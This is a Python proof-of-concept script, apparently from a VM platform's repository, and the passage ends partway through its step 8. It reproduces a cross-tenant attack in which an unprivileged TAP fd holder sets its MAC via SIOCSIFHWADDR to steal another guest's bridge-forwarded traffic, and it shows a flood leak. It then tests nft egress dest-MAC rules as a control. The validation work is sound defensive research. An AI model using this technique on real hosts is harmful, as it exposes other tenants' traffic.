#!/usr/bin/env python3
"""SPIKE increment-z: cross-tenant host->guest MAC/FDB steal + ADR-0142 egress control.

Throwaway defensive probe. Not production. Not a test tier. Deleted when the
implementation it validates lands (.claude/rules/spike.md). No file under
crates/ is created or modified.

WHY (defensive): the replacement DESIGN (ADR-0142 / D-295-R21, finding R5-H1)
adds a per-TAP TCX egress classifier that drops host-originated frames whose
destination MAC is not that TAP's registered guest MAC. The review reasoned
from kernel source that WITHOUT such a control a compromised VMM (Cloud
Hypervisor, uid 4200, no CAP_NET_ADMIN, holding only its own TAP's queue fd)
could capture another guest's host-to-guest plaintext by setting its own TAP's
host-side MAC to the victim guest's MAC via SIOCSIFHWADDR. This probe
reproduces the platform's own isolation boundary on a REAL kernel to (1)
confirm the hazard is real (STEAL REPRODUCED), and (2) confirm a dest-MAC
egress gate closes it (CONTROL BLOCKS). Authorized testing of the user's own
platform on the user's own bare-metal box.

MODEL: two host TAPs (spiketapa/spiketapb) on one Linux bridge model two guest
microVM TAPs. No real guest VM is needed -- writing a frame to a TAP queue fd
injects it as if from that guest (bridge learns the src MAC on that port);
sending an AF_PACKET SOCK_RAW frame on the BRIDGE device is the host-transmit
path (br_dev_xmit / net/bridge/br_device.c). The attacker is a forked child
holding ONLY spiketapa's queue fd, dropped to uid 4200 with no capabilities.

Kernel facts under test (research addendum 2 B1; ADR-0142; reproduce, don't
re-derive):
  - SIOCSIFHWADDR on an attached tun queue fd reaches dev_set_mac_address_user
    with NO capability/owner check (tun.c __tun_chr_ioctl arm 3385-3394),
    unlike the socket path which requires CAP_NET_ADMIN (dev_ioctl.c 797,
    808-809). IFF_LIVE_ADDR_CHANGE lets it apply while up.
  - Changing the port MAC drives br_fdb_changeaddr -> fdb_add_local
    (br_fdb.c 430-458, 460-504): the victim's learned (non-local) entry is
    deleted and a LOCAL|STATIC entry for that MAC is installed on the
    attacker's port. br_dev_xmit forwards host unicast for that MAC out the
    attacker's port without testing BR_FDB_LOCAL (br_device.c 109-112);
    sticky against re-learning (br_fdb.c 985-988).
  - Unknown-unicast is flooded to every flood-enabled port (br_forward.c
    216-218): a leak with no MAC change at all.

CONTROL (ADR-0142): the production form is a TCX egress classifier keyed on the
registered guest MAC. The ADR itself names an nft bridge-family output/forward
rule keyed on oifname + ether daddr as the functional equivalent that
"observes the same frame at NF_BR_LOCAL_OUT". This probe uses that nft form to
prove the dest-MAC egress gate closes the path on a real kernel, plus
`bridge link set ... flood off` for the flood variant. The production form
remains TCX egress (ADR-0142 Decision).
"""

import argparse
import ctypes
import errno
import fcntl
import hashlib
import json
import os
import pathlib
import socket
import struct
import sys
import time

# --- tun / net ioctls & flags (include/uapi/linux/if_tun.h, sockios.h) ---
TUNSETIFF = 0x400454CA
TUNSETPERSIST = 0x400454CB
TUNSETOWNER = 0x400454CC
TUNSETOFFLOAD = 0x400454D0
TUNGETIFF = 0x800454D2
SIOCSIFHWADDR = 0x8924
SIOCGIFHWADDR = 0x8927
IFF_TAP = 0x0002
IFF_PERSIST = 0x0800
IFF_NO_PI = 0x1000
IFF_VNET_HDR = 0x4000
ARPHRD_ETHER = 1
SO_TIMESTAMPNS = 35
PR_SET_NO_NEW_PRIVS = 38

UID = 4200  # overdrive_core::vm::config::OVERDRIVE_VMM_UID
GID = 4200
STAT_NAMES = ("rx_packets", "tx_packets", "rx_bytes", "tx_bytes", "rx_dropped", "tx_dropped")

# overdrive_core::dataplane::GUEST_BRIDGE_MAC = [0x02,0x01,0x00,0x00,0x00,0x01]
BRIDGE_MAC = bytes([0x02, 0x01, 0x00, 0x00, 0x00, 0x01])
BRIDGE_IP = "100.95.0.1"
# Guest MAC derivation (guest_network.rs): [0x02,0x00] ++ ipv4.octets().
GUEST_A_IP = "100.95.0.2"
GUEST_B_IP = "100.95.0.3"
GUEST_C_IP = "100.95.0.4"  # unknown / never-learned, for the flood variant
MAGIC = b"SPKZ"

started = time.perf_counter()


def mac_bytes(ip):
    return bytes([0x02, 0x00] + [int(o) for o in ip.split(".")])


def mac_str(raw):
    return ":".join(f"{b:02x}" for b in raw)


GUEST_A_MAC = mac_bytes(GUEST_A_IP)
GUEST_B_MAC = mac_bytes(GUEST_B_IP)
GUEST_C_MAC = mac_bytes(GUEST_C_IP)


def emit(phase, text):
    print(f"[+{time.perf_counter() - started:9.6f}] {phase} {text}", flush=True)


def run(argv, check_rc=True):
    import subprocess
    return subprocess.run(argv, check=check_rc, text=True, capture_output=True)


def cmd_out(argv):
    return run(argv).stdout.strip()


def errno_text(error):
    return f"errno={error.errno}({errno.errorcode.get(error.errno, '?')}) {error.strerror}"


def iface_exists(name):
    return pathlib.Path("/sys/class/net", name).exists()


def read_sys(name, attr):
    try:
        return pathlib.Path(f"/sys/class/net/{name}/{attr}").read_text().strip()
    except FileNotFoundError:
        return "ABSENT"
    except OSError as error:
        return errno_text(error)


def link_json(name):
    return json.loads(cmd_out(["ip", "-j", "-d", "link", "show", "dev", name]))[0]


def stats(name):
    return {s: int(read_sys(name, f"statistics/{s}")) for s in STAT_NAMES}


def tun_holders(name):
    holders = []
    for fdinfo in pathlib.Path("/proc").glob("[0-9]*/fdinfo/*"):
        try:
            text = fdinfo.read_text()
        except (FileNotFoundError, PermissionError, ProcessLookupError, OSError):
            continue
        for line in text.splitlines():
            parts = line.split()
            if len(parts) == 2 and parts[0] == "iff:" and parts[1] == name:
                pid = int(fdinfo.parts[2])
                holders.append([pid, int(fdinfo.name)])
    return sorted(holders)


def fdb_show(bridge):
    """Every FDB entry on the bridge, one dict per line."""
    out = run(["bridge", "fdb", "show", "br", bridge], check_rc=False).stdout
    return [line.strip() for line in out.splitlines() if line.strip()]


def fdb_for_mac(bridge, mac):
    target = mac_str(mac)
    return [line for line in fdb_show(bridge) if line.lower().startswith(target)]


# --- frame construction (IPv4/UDP with a searchable marker) ---
def ip_checksum(header):
    if len(header) % 2:
        header += b"\0"
    total = sum(struct.unpack(f"!{len(header) // 2}H", header))
    total = (total & 0xFFFF) + (total >> 16)
    total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def build_frame(dst_mac, src_mac, src_ip, dst_ip, label, seq):
    payload = MAGIC + b"|" + label.encode() + b"|" + str(seq).encode()
    udp_len = 8 + len(payload)
    udp = struct.pack("!HHHH", 40001, 40002, udp_len, 0) + payload
    total_len = 20 + udp_len
    ip_wo_csum = struct.pack(
        "!BBHHHBBH4s4s", 0x45, 0, total_len, seq & 0xFFFF, 0, 64, 17, 0,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
    )
    csum = ip_checksum(ip_wo_csum)
    ip = ip_wo_csum[:10] + struct.pack("!H", csum) + ip_wo_csum[12:]
    eth = dst_mac + src_mac + struct.pack("!H", 0x0800)
    return eth + ip + udp


def frame_marker(frame):
    idx = frame.find(MAGIC)
    if idx < 0:
        return None
    tail = frame[idx:idx + 40].split(b"\0", 1)[0]
    return tail.decode("ascii", "replace")


def summarize(frame):
    if len(frame) < 14:
        return {"len": len(frame), "truncated": True}
    return {
        "len": len(frame),
        "dst": mac_str(frame[0:6]),
        "src": mac_str(frame[6:12]),
        "etype": f"0x{int.from_bytes(frame[12:14], 'big'):04x}",
        "marker": frame_marker(frame),
    }


# --- tun helpers ---
def tun_open():
    return os.open("/dev/net/tun", os.O_RDWR)


def tun_setiff(fd, name, flags):
    fcntl.ioctl(fd, TUNSETIFF, struct.pack("16sH22x", name.encode(), flags))


def tun_getiff(fd):
    raw = fcntl.ioctl(fd, TUNGETIFF, bytes(40))
    name, flags = struct.unpack("16sH22x", raw)
    return f"name={name.rstrip(bytes(1)).decode()} flags=0x{flags:04x}"


def create_persistent_tap(name, owner):
    """Mirror overdrive_netlink::create_persistent_tap (creator closes its fd)."""
    fd = tun_open()
    try:
        tun_setiff(fd, name, IFF_TAP | IFF_NO_PI)
        fcntl.ioctl(fd, TUNSETOFFLOAD, 0)
        fcntl.ioctl(fd, TUNSETOWNER, owner)
        fcntl.ioctl(fd, TUNSETPERSIST, 1)
    finally:
        os.close(fd)


def attach_queue(name, flags=IFF_TAP | IFF_NO_PI):
    fd = tun_open()
    try:
        tun_setiff(fd, name, flags)
    except OSError:
        os.close(fd)
        raise
    os.set_blocking(fd, False)
    return fd


def drain_fd(fd):
    frames = []
    while True:
        try:
            frames.append(os.read(fd, 65535))
        except BlockingIOError:
            return frames
        except OSError as error:
            if error.errno in (errno.EAGAIN, errno.EWOULDBLOCK, errno.EIO):
                return frames
            raise


def caps_now():
    out = {}
    for line in pathlib.Path("/proc/self/status").read_text().splitlines():
        for key in ("Uid:", "Gid:", "Groups:", "CapInh:", "CapPrm:", "CapEff:", "CapBnd:", "NoNewPrivs:"):
            if line.startswith(key):
                out[key.rstrip(":")] = line.split(":", 1)[1].strip()
    return out


# ---------------------------------------------------------------------------
# Attacker child: holds ONLY spiketapa's queue fd, drops to uid 4200 no-caps,
# then serves a command loop from the parent over pipes.
# ---------------------------------------------------------------------------
def attacker_child(tap_a, p2c_r, c2p_w):
    p2c = os.fdopen(p2c_r, "r")
    c2p = os.fdopen(c2p_w, "w")

    def reply(obj):
        c2p.write(json.dumps(obj, sort_keys=True) + "\n")
        c2p.flush()

    fd = None
    try:
        # Attach as root (models the launcher attaching before setpriv drop).
        fd = attach_queue(tap_a)
        attach_iff = tun_getiff(fd)
        # Drop privileges: no_new_privs, empty supplementary groups, gid, uid.
        try:
            libc = ctypes.CDLL("libc.so.6", use_errno=True)
            libc.prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)
        except OSError:
            pass
        os.setgroups([])
        os.setgid(GID)
        os.setuid(UID)
        while True:
            line = p2c.readline()
            if not line:
                break
            command = line.strip()
            if command == "INIT":
                reply({"ok": True, "attach_iff": attach_iff, "fd": fd, "caps": caps_now()})
            elif command == "LEARN_A":
                # Inject a guest-A-originated frame so the bridge learns
                # GUEST_A_MAC on spiketapa (models guest A's first packet).
                frame = build_frame(BRIDGE_MAC, GUEST_A_MAC, GUEST_A_IP, BRIDGE_IP, "learnA", 0)
                n = os.write(fd, frame)
                reply({"ok": True, "wrote": n})
            elif command == "STEAL":
                # THE ATTACK: set spiketapa's host-side MAC to the victim's
                # guest MAC via SIOCSIFHWADDR on the held queue fd, as uid 4200
                # with no CAP_NET_ADMIN.
                caps_at = caps_now()
                ifr = struct.pack("16sH6s16x", tap_a.encode(), ARPHRD_ETHER, GUEST_B_MAC)
                try:
                    fcntl.ioctl(fd, SIOCSIFHWADDR, ifr)
                    ioctl_rc, ioctl_errno = 0, 0
                except OSError as error:
                    ioctl_rc, ioctl_errno = -1, error.errno
                # Read back the netdev MAC via SIOCGIFHWADDR on the same fd.
                try:
                    got = fcntl.ioctl(fd, SIOCGIFHWADDR, struct.pack("16sH6s16x", tap_a.encode(), 0, bytes(6)))
                    readback = mac_str(struct.unpack("16sH6s16x", got)[2])
                except OSError as error:
                    readback = errno_text(error)
                reply({
                    "ok": ioctl_rc == 0, "ioctl_rc": ioctl_rc, "ioctl_errno": ioctl_errno,
                    "ioctl_errname": errno.errorcode.get(ioctl_errno, "0") if ioctl_errno else "0",
                    "mac_readback": readback, "caps_at_ioctl": caps_at,
                })
            elif command.startswith("DRAIN:"):
                label = command.split(":", 1)[1]
                frames = [summarize(f) for f in drain_fd(fd)]
                reply({"ok": True, "label": label, "count": len(frames), "frames": frames})
            elif command == "EXIT":
                reply({"ok": True, "bye": True})
                break
            else:
                reply({"ok": False, "unknown": command})
    except BaseException as error:  # noqa: BLE001 - report anything to the parent
        try:
            reply({"ok": False, "child_error": f"{type(error).__name__}: {error}"})
        except Exception:
            pass
    finally:
        if fd is not None:
            try:
                os.close(fd)
            except OSError:
                pass
        try:
            c2p.close()
        except Exception:
            pass
        os._exit(0)


# ---------------------------------------------------------------------------
def sweep():
    """Remove leftover spikebr*/spiketap* links and spikeguard* nft tables."""
    removed = []
    links = json.loads(cmd_out(["ip", "-j", "link", "show"]))
    for link in links:
        name = link.get("ifname", "")
        if name.startswith(("spikebr", "spiketap")):
            run(["ip", "link", "delete", "dev", name], check_rc=False)
            removed.append(f"link={name}")
    tables = run(["nft", "-j", "list", "tables"], check_rc=False).stdout
    if tables:
        try:
            for entry in json.loads(tables).get("nftables", []):
                tbl = entry.get("table", {})
                if tbl.get("family") == "bridge" and tbl.get("name", "").startswith("spikeguard"):
                    run(["nft", "delete", "table", "bridge", tbl["name"]], check_rc=False)
                    removed.append(f"nft={tbl['name']}")
        except json.JSONDecodeError:
            pass
    print(f"SWEEP removed={removed}", flush=True)
    return removed


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--sweep", action="store_true", help="remove leftover spike* resources and exit")
    args = parser.parse_args()
    if args.sweep:
        sweep()
        return 0

    tag = f"{os.getpid() & 0xffff:04x}"
    bridge = f"spikebr{tag}"
    tap_a = f"spiketapa{tag}"
    tap_b = f"spiketapb{tag}"
    nft = f"spikeguard{tag}"

    victim_b_fd = None
    cap_a = None
    cap_b = None
    child_pid = None
    p2c_w = None
    c2p_r = None
    verdicts = {}
    results = {}

    # Use a persistent line-reader for the child result pipe.
    c2p_reader = None

    def child(command):
        os.write(p2c_w, (command + "\n").encode())
        return json.loads(c2p_reader.readline())

    def new_capture(name):
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        sock.bind((name, 0))
        sock.setblocking(False)
        return sock

    def drain_cap(sock):
        frames = []
        while True:
            try:
                frame = sock.recv(65535)
            except (BlockingIOError, OSError):
                return frames
            frames.append(summarize(frame))

    def send_host_frame(bridge_sock, dst_mac, dst_ip, label, count=3):
        for seq in range(count):
            bridge_sock.send(build_frame(dst_mac, BRIDGE_MAC, BRIDGE_IP, dst_ip, label, seq))

    try:
        # ---------------- PREFLIGHT ----------------
        emit("PREFLIGHT", "hypothesis=native root x86_64 metal, no pre-existing exact resources for this tag")
        if os.geteuid() != 0:
            raise SystemExit("PREFLIGHT: must run through `cargo xtask metal run --` (root context)")
        machine = cmd_out(["uname", "-m"])
        if machine != "x86_64":
            raise SystemExit(f"PREFLIGHT: native qualification requires x86_64, got {machine}")
        virt = run(["systemd-detect-virt"], check_rc=False).stdout.strip()
        if virt != "none":
            raise SystemExit(f"PREFLIGHT: native qualification requires systemd-detect-virt=none, got {virt!r}")
        for name in (bridge, tap_a, tap_b):
            if iface_exists(name):
                raise SystemExit(f"PREFLIGHT: refusing pre-existing exact link {name}")
        if run(["nft", "list", "table", "bridge", nft], check_rc=False).returncode == 0:
            raise SystemExit(f"PREFLIGHT: refusing pre-existing exact nft table {nft}")
        pre_sweep = sweep()
        emit("ENV", f"uname={cmd_out(['uname', '-srmo'])}")
        emit("ENV", f"kernel_release={cmd_out(['uname', '-r'])}")
        emit("ENV", f"systemd_detect_virt={virt}")
        emit("ENV", f"python={sys.version.split()[0]}")
        emit("ENV", f"parent_identity={cmd_out(['id'])}")
        emit("ENV", f"names bridge={bridge} tap_a={tap_a} tap_b={tap_b} nft={nft}")
        emit("ENV", f"bridge_mac={mac_str(BRIDGE_MAC)} guestA_mac={mac_str(GUEST_A_MAC)} "
                    f"guestB_mac={mac_str(GUEST_B_MAC)} guestC_mac={mac_str(GUEST_C_MAC)}")
        emit("ENV", f"pre_run_sweep={pre_sweep}")
        emit("PREFLIGHT", "RESULT=PASS")

        # ---------------- STEP 1: SETUP ----------------
        emit("STEP1", "hypothesis=a bridge with an explicit MAC + two persistent owner-4200 TAPs, enslaved and up, "
                      "model two guest microVM TAPs")
        emit("STEP1", "prediction=bridge MAC=02:01:00:00:00:01; both TAPs persistent owner=4200 master=bridge; "
                      "forwarding once a queue attaches (carrier on)")
        emit("STEP1", "falsification=explicit bridge MAC not honored, TAP not persistent/owned, or not enslaved")
        run(["ip", "link", "add", "name", bridge, "type", "bridge", "stp_state", "0", "forward_delay", "0"])
        emit("STEP1", f"bridge_mac_at_create={link_json(bridge)['address']} "
                      f"addr_assign_type={read_sys(bridge, 'addr_assign_type')}")
        run(["ip", "link", "set", bridge, "address", mac_str(BRIDGE_MAC)])
        emit("STEP1", f"bridge_mac_after_explicit_set={link_json(bridge)['address']} "
                      f"addr_assign_type={read_sys(bridge, 'addr_assign_type')}")
        run(["ip", "addr", "add", f"{BRIDGE_IP}/24", "dev", bridge])
        run(["ip", "link", "set", bridge, "up"])
        for name in (tap_a, tap_b):
            create_persistent_tap(name, UID)
            run(["ip", "link", "set", name, "master", bridge])
            run(["ip", "link", "set", name, "up"])
        emit("STEP1", f"bridge_mac_after_enslave={link_json(bridge)['address']} "
                      f"addr_assign_type={read_sys(bridge, 'addr_assign_type')}")
        # Re-assert the fixed bridge MAC as the last word (ADR-0126 shape) and
        # record whether it sticks. Not load-bearing for the steal/control
        # verdict (delivery keys on the destination MAC, not the bridge MAC).
        run(["ip", "link", "set", bridge, "address", mac_str(BRIDGE_MAC)])
        bridge_mac_readback = link_json(bridge)["address"]
        emit("STEP1", f"bridge_mac_final={bridge_mac_readback} "
                      f"addr_assign_type={read_sys(bridge, 'addr_assign_type')}")
        results["bridge_mac_explicit_ok"] = bridge_mac_readback == mac_str(BRIDGE_MAC)
        for name in (tap_a, tap_b):
            lj = link_json(name)
            emit("STEP1", f"{name}: address={lj['address']} tun_flags={read_sys(name, 'tun_flags')} "
                          f"owner={read_sys(name, 'owner')} master={lj.get('master')} flags={lj['flags']}")
        emit("STEP1", f"RESULT=PASS setup complete (bridge_mac_explicit_ok={results['bridge_mac_explicit_ok']})")

        # ---------------- Fork attacker child (holds ONLY spiketapa's queue) ----------------
        p2c_r, p2c_w = os.pipe()
        c2p_r, c2p_w = os.pipe()
        child_pid = os.fork()
        if child_pid == 0:
            os.close(p2c_w)
            os.close(c2p_r)
            attacker_child(tap_a, p2c_r, c2p_w)
            os._exit(0)  # unreachable
        os.close(p2c_r)
        os.close(c2p_w)
        c2p_reader = os.fdopen(c2p_r, "r")

        # Parent attaches spiketapb (models the live victim guest B's VMM).
        victim_b_fd = attach_queue(tap_b)
        time.sleep(0.3)  # let carrier/forwarding settle on both ports

        init = child("INIT")
        emit("ATTACKER", f"child_init={json.dumps(init, sort_keys=True)}")
        emit("ATTACKER", f"parent_victim_b_fd={victim_b_fd} victim_b_TUNGETIFF={tun_getiff(victim_b_fd)}")
        for name in (tap_a, tap_b):
            emit("ATTACKER", f"{name}: carrier={read_sys(name, 'carrier')} operstate={read_sys(name, 'operstate')} "
                             f"bridge_state={cmd_out(['bridge', '-details', 'link', 'show', 'dev', name])}")
        child_caps = init.get("caps", {})
        no_cap_net_admin = child_caps.get("CapEff", "ffffffffffffffff") == "0000000000000000"
        results["attacker_uid_4200_no_caps"] = (
            init.get("caps", {}).get("Uid", "").split()[:2] == [str(UID), str(UID)] and no_cap_net_admin
        )

        cap_a = new_capture(tap_a)
        cap_b = new_capture(tap_b)

        def deliver(bridge_sock, label, dst_mac, dst_ip):
            """Clear queues, send host->dst frames, observe on A (child fd + cap),
            B (victim fd + cap)."""
            child(f"DRAIN:clear-{label}")
            drain_fd(victim_b_fd)
            drain_cap(cap_a)
            drain_cap(cap_b)
            send_host_frame(bridge_sock, dst_mac, dst_ip, label)
            time.sleep(0.25)
            child_a = child(f"DRAIN:{label}")
            fd_b = [summarize(f) for f in drain_fd(victim_b_fd)]
            capa = drain_cap(cap_a)
            capb = drain_cap(cap_b)

            def hits(frames):
                return sum(1 for f in frames if f.get("marker") == f"{MAGIC.decode()}|{label}|0"
                           or (f.get("marker") or "").startswith(f"{MAGIC.decode()}|{label}|"))

            obs = {
                "label": label, "dst_mac": mac_str(dst_mac),
                "A_child_fd": child_a.get("count", 0), "A_child_hits": hits(child_a.get("frames", [])),
                "A_cap": len(capa), "A_cap_hits": hits(capa),
                "B_victim_fd": len(fd_b), "B_victim_hits": hits(fd_b),
                "B_cap": len(capb), "B_cap_hits": hits(capb),
                "A_frames": child_a.get("frames", [])[:4], "B_frames": fd_b[:4],
            }
            emit("DELIVER", json.dumps(obs, sort_keys=True))
            return obs

        bridge_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        bridge_sock.bind((bridge, 0))

        # ---------------- STEP 2: LEARN both guest MACs ----------------
        emit("STEP2", "hypothesis=injecting a guest-sourced frame from each TAP fd makes the bridge learn each guest "
                      "MAC as a dynamic (non-local) FDB entry on its own port")
        emit("STEP2", "prediction=GUEST_A_MAC learned on spiketapa, GUEST_B_MAC learned on spiketapb; both non-permanent")
        emit("STEP2", "falsification=either MAC absent from the FDB or learned on the wrong port")
        learn_a = child("LEARN_A")
        emit("STEP2", f"child_learn_a={json.dumps(learn_a, sort_keys=True)}")
        # Learn B from the parent's victim fd.
        os.set_blocking(victim_b_fd, True)
        os.write(victim_b_fd, build_frame(BRIDGE_MAC, GUEST_B_MAC, GUEST_B_IP, BRIDGE_IP, "learnB", 0))
        os.set_blocking(victim_b_fd, False)
        time.sleep(0.25)
        drain_fd(victim_b_fd)
        fdb_a = fdb_for_mac(bridge, GUEST_A_MAC)
        fdb_b = fdb_for_mac(bridge, GUEST_B_MAC)
        emit("STEP2", f"fdb_guestA={fdb_a}")
        emit("STEP2", f"fdb_guestB={fdb_b}")
        emit("STEP2", f"full_fdb={fdb_show(bridge)}")
        learned_ok = any(tap_a in e for e in fdb_a) and any(tap_b in e for e in fdb_b)
        emit("STEP2", f"RESULT={'PASS' if learned_ok else 'PARTIAL'} learned_ok={learned_ok}")

        # ---------------- STEP 3: BASELINE delivery ----------------
        emit("STEP3", "hypothesis=host->guestB is delivered to spiketapb (victim) and NOT to spiketapa (attacker); "
                      "this is the litmus that a steal would be observable")
        emit("STEP3", "prediction=B receives host->guestB (victim_fd/cap hits>0); A receives none for guestB; "
                      "host->guestA is received by A only")
        emit("STEP3", "falsification=A receives host->guestB even before any attack")
        base_b = deliver(bridge_sock, "baseB", GUEST_B_MAC, GUEST_B_IP)
        base_a = deliver(bridge_sock, "baseA", GUEST_A_MAC, GUEST_A_IP)
        baseline_ok = (base_b["B_victim_hits"] > 0 and base_b["A_child_hits"] == 0 and base_b["A_cap_hits"] == 0
                       and base_a["A_child_hits"] > 0)
        results["baseline_isolated"] = baseline_ok
        emit("STEP3", f"RESULT={'PASS' if baseline_ok else 'FAIL'} baseline_ok={baseline_ok}")

        # ---------------- STEP 4: THE ATTACK (SIOCSIFHWADDR on the held fd) ----------------
        emit("STEP4", "hypothesis=uid-4200 no-CAP_NET_ADMIN holder of spiketapa's queue fd sets its host-side MAC to "
                      "GUEST_B_MAC via SIOCSIFHWADDR; the bridge moves GUEST_B_MAC to spiketapa as LOCAL|STATIC")
        emit("STEP4", "prediction=ioctl rc=0 (no EPERM) with CapEff=0; fdb GUEST_B_MAC now on spiketapa permanent; "
                      "bridge device MAC unchanged (set explicitly => NET_ADDR_SET)")
        emit("STEP4", "falsification=ioctl returns EPERM, or the FDB entry does not move to spiketapa")
        fdb_b_before = fdb_for_mac(bridge, GUEST_B_MAC)
        bridge_mac_before = link_json(bridge)["address"]
        steal = child("STEAL")
        emit("STEP4", f"child_steal={json.dumps(steal, sort_keys=True)}")
        time.sleep(0.25)
        fdb_b_after = fdb_for_mac(bridge, GUEST_B_MAC)
        bridge_mac_after = link_json(bridge)["address"]
        emit("STEP4", f"fdb_guestB_before_attack={fdb_b_before}")
        emit("STEP4", f"fdb_guestB_after_attack={fdb_b_after}")
        emit("STEP4", f"tap_a_mac_after={link_json(tap_a)['address']} tap_b_mac_after={link_json(tap_b)['address']}")
        emit("STEP4", f"bridge_mac before={bridge_mac_before} after={bridge_mac_after} "
                      f"(explicit-set protects per ADR-0126 / br_stp_recalculate_bridge_id NET_ADDR_SET)")
        emit("STEP4", f"full_fdb_after_attack={fdb_show(bridge)}")
        ioctl_ok = steal.get("ioctl_rc") == 0
        caps_zero_at_ioctl = steal.get("caps_at_ioctl", {}).get("CapEff") == "0000000000000000"
        fdb_moved = any(tap_a in e for e in fdb_b_after) and any("permanent" in e or "static" in e for e in fdb_b_after)
        results["ioctl_no_cap_net_admin"] = ioctl_ok and caps_zero_at_ioctl
        results["fdb_stolen_to_attacker"] = fdb_moved
        # Protection = the bridge's own MAC does not move when the attacker
        # sets its port MAC to the (numerically lower) guest-B MAC. Meaningful
        # regardless of the base bridge MAC value.
        results["bridge_mac_unmoved_by_attack"] = bridge_mac_before == bridge_mac_after
        results["bridge_mac_not_stolen_gateway"] = bridge_mac_after != mac_str(GUEST_B_MAC)
        emit("STEP4", f"RESULT ioctl_ok={ioctl_ok} caps_zero_at_ioctl={caps_zero_at_ioctl} fdb_moved={fdb_moved}")

        # ---------------- STEP 5: POST-ATTACK delivery = THE STEAL ----------------
        emit("STEP5", "hypothesis=after the MAC change, host->guestB is forwarded to spiketapa (attacker) instead of "
                      "spiketapb (victim); the attacker reads the victim's host-to-guest plaintext from its own fd")
        emit("STEP5", "prediction=A_child_fd hits>0 for host->guestB; B_victim hits==0")
        emit("STEP5", "falsification=A receives nothing / B still receives it (no steal)")
        steal_obs = deliver(bridge_sock, "stealB", GUEST_B_MAC, GUEST_B_IP)
        steal_reproduced = steal_obs["A_child_hits"] > 0 and steal_obs["B_victim_hits"] == 0
        results["steal_reproduced"] = steal_reproduced
        emit("STEP5", f"RESULT={'STEAL REPRODUCED' if steal_reproduced else 'NO STEAL'} "
                      f"A_child_hits={steal_obs['A_child_hits']} B_victim_hits={steal_obs['B_victim_hits']}")

        # ---------------- STEP 6: FLOOD-LEAK variant (unknown unicast) ----------------
        emit("STEP6", "hypothesis=host->guestC (a MAC never learned) is flooded to every flood-enabled port, so the "
                      "attacker receives it with NO MAC change at all (br_forward.c 216-218)")
        emit("STEP6", "prediction=A_child_fd hits>0 AND B_victim hits>0 for host->guestC (flooded to both)")
        emit("STEP6", "falsification=the unknown-unicast frame reaches neither or only the intended port")
        flood_obs = deliver(bridge_sock, "floodC", GUEST_C_MAC, GUEST_C_IP)
        flood_leak = flood_obs["A_child_hits"] > 0
        results["flood_leak_reproduced"] = flood_leak
        emit("STEP6", f"RESULT={'FLOOD LEAK REPRODUCED' if flood_leak else 'NO FLOOD LEAK'} "
                      f"A_child_hits={flood_obs['A_child_hits']} B_victim_hits={flood_obs['B_victim_hits']}")

        verdicts["STEAL_REPRODUCED"] = steal_reproduced

        # ---------------- STEP 7: THE CONTROL (nft egress dest-MAC gate) ----------------
        emit("STEP7", "hypothesis=an ADR-0142-shaped egress dest-MAC gate (nft bridge output/postrouting keyed on "
                      "oifname + ether daddr, delivering only the registered guest MAC, mcast/bcast exempt) drops the "
                      "stolen and flooded host->guest frames before they reach the attacker; production form is TCX egress")
        emit("STEP7", "prediction=with the gate active, A_child hits==0 and A_cap==0 for host->guestB (stolen) AND "
                      "host->guestC (flood); a drop counter increments; broadcast still passes")
        emit("STEP7", "falsification=the attacker still receives host->guestB or host->guestC with the gate active")
        run(["nft", "add", "table", "bridge", nft])
        # Chains on the two hooks that can observe a host-originated frame egressing a port.
        run(["nft", "add", "chain", "bridge", nft, "out",
             "{ type filter hook output priority -300; policy accept; }"])
        run(["nft", "add", "chain", "bridge", nft, "post",
             "{ type filter hook postrouting priority -300; policy accept; }"])
        # Registered-MAC egress delivery: on each managed port, drop unicast whose
        # dest MAC != that TAP's registered guest MAC (mcast/bcast exempt via the
        # multicast bit of the first octet).
        for chain in ("out", "post"):
            run(["nft", "add", "rule", "bridge", nft, chain,
                 "oifname", tap_a,
                 "ether", "daddr", "&", "01:00:00:00:00:00", "==", "00:00:00:00:00:00",
                 "ether", "daddr", "!=", mac_str(GUEST_A_MAC), "counter", "drop"])
            run(["nft", "add", "rule", "bridge", nft, chain,
                 "oifname", tap_b,
                 "ether", "daddr", "&", "01:00:00:00:00:00", "==", "00:00:00:00:00:00",
                 "ether", "daddr", "!=", mac_str(GUEST_B_MAC), "counter", "drop"])
        emit("STEP7", "nft_ruleset:")
        for line in cmd_out(["nft", "-a", "list", "table", "bridge", nft]).splitlines():
            emit("STEP7", "  " + line)
        # Re-run the steal delivery (stolen FDB state persists) under the gate.
        ctrl_steal = deliver(bridge_sock, "ctrlStealB", GUEST_B_MAC, GUEST_B_IP)
        # Re-run the flood variant under the gate.
        ctrl_flood = deliver(bridge_sock, "ctrlFloodC", GUEST_C_MAC, GUEST_C_IP)
        # Broadcast must still be delivered (ARP path unaffected).
        bcast = deliver(bridge_sock, "ctrlBcast", b"\xff" * 6, GUEST_B_IP)
        counters = cmd_out(["nft", "list", "table", "bridge", nft])
        emit("STEP7", "nft_counters:")
        for line in counters.splitlines():
            if "counter" in line and "packets" in line:
                emit("STEP7", "  " + line.strip())
        steal_blocked = ctrl_steal["A_child_hits"] == 0 and ctrl_steal["A_cap_hits"] == 0
        flood_blocked_nft = ctrl_flood["A_child_hits"] == 0 and ctrl_flood["A_cap_hits"] == 0
        bcast_ok = bcast["A_child_hits"] > 0 or bcast["A_cap"] > 0  # broadcast reaches attacker port (expected/allowed)
        results["control_nft_blocks_steal"] = steal_blocked
        results["control_nft_blocks_flood"] = flood_blocked_nft
        results["control_nft_allows_broadcast"] = bcast_ok
        emit("STEP7", f"RESULT steal_blocked={steal_blocked} flood_blocked_nft={flood_blocked_nft} "
                      f"broadcast_still_delivered={bcast_ok}")

        # ---------------- STEP 8: independent flood control (bridge flood off) ----------------
        emit("STEP8", "hypothesis=independently of nft, disabling bridge unicast flooding on the attacker port stops the "
                      "unknown-unicast flood leak while leaving broadcast/multicast delivery intact")
        emit("STEP8", "prediction=with the nft table removed and `bridge link set spiketapa flood off`, host->guestC no "
                      "longer reaches A; broadcast still reaches A")
        emit("STEP8", "falsification=flood off does not stop the unknown-unicast leak, or it also blocks broadcast")
        run(["nft", "delete", "table", "bridge", nft])
        # Regression check: without the nft gate the flood leaks to A again.
